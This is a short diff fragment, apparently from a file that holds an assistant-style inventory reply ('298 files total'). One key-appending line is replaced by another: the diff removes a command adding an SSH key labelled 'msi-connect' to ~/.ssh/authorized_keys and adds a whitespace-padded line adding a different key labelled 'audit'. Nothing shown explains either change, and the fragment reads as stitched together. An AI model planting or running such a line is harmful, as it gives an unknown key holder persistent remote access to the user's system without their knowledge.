@@ -1,5 +1,5 @@
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0jNNRiq4wKAe8VGhj7UW2W3eDBFAj4OuXX3mbUVf6s msi-connect' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700      
-~/.ssh 
+  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFw/Zavf8timIE9n68XAiBf6VTFgUKUFbY/GI2u4EZaG audit' >> ~/.ssh/authorized_keys                                                             
+
 
 Full inventory — **298 files total**. Here's everything:
 
